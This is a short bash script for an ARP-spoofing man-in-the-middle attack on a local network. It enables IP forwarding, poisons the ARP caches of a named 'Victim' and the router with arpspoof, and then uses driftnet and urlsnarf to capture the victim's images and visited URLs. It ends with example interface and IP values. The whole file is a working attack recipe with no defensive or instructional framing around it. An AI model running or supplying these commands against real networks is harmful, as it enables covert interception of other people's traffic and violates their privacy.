#!/bin/bash
# Enable port forwarding
sysctl -w net.ipv4.ip_forward=1

# Spoof connection between Victim and Router
# Note: Run this command in a new terminal and let it running
arpspoof -i [Network Interface Name] -t [Victim IP] [Router IP]

# Note: Run this command in a new terminal and let it running
arpspoof -i [Network Interface Name] -t [Router IP] [Victim IP]

# Execute driftnet to sniff images
# Note: Run this command in a new terminal and let it running
driftnet -i [Network Interface Name]

# Sniff URL traffic of the victim
# Note: Run this command in a new terminal and let it running
urlsnarf -i [Network Interface Name]

# Disable port forwarding once you're done with the attack
sysctl -w net.ipv4.ip_forward=0

# Examples for values
# [Network Interface Name] = wlan0
# [Victim IP] = 192.168.1.9
# [Router IP] = 192.168.1.1